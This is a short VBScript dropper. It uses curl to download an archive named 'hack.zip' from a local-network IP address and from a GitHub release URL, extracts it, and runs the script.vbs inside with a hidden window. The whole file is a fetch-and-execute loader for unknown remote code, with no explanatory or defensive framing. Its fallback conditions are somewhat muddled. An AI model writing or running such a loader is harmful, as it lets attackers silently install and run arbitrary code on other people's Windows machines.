set objShell = CreateObject("WScript.shell")
set objExeCurl = objShell.Exec("curl -O  http://192.168.1.34:8080/hack.zip")

If objExeCurl.ExitCode=0 Then
	set objExeCurl2 = objShell.Exec("curl -LOJ https://github.com/Rahilkzi/practon/releases/download/v1/hack.zip")
End If

If objExeCurl2.ExitCode=0 Then
	set objExeCurl3 = objShell.Exec("curl -LO https://github.com/Rahilkzi/practon/releases/download/v1/hack.zip")
End If

WScript.Sleep 5000
If objExeCurl2.ExitCode=0 Then
	set objExeTar = objShell.Exec("tar -xf hack.zip")
End If

WScript.Sleep 5000


Dim SourceFolder, newD
SourceFolder = CreateObject("Scripting.FileSystemObject").GetAbsolutePathName(".")
newD = SourceFolder & "\" & "hack"
objShell.CurrentDirectory = newD
objShell.Run "wscript.exe script.vbs", 0, false

WScript.Quit
